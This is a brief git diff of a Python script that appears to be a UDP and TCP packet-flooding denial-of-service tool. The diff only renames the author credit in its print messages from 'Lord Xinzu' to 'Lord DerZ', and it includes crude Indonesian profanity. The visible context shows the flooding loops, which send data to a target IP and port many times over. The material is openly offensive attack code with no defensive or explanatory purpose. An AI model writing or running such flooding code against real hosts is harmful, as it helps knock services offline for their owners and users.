@@ -25,7 +25,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Paket From Lord Xinzu!!! ")
+			print(i +" Paket From Lord DerZ!!! ")
 		except:
 			print("[!] Down Kontol!!!")
 
@@ -39,7 +39,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Paket From Lord Xinzu!!! ")
+			print(i +" Paket From Lord DerZ!!! ")
 		except:
 			s.close()
 			print("[*] Down Kontol!!!")
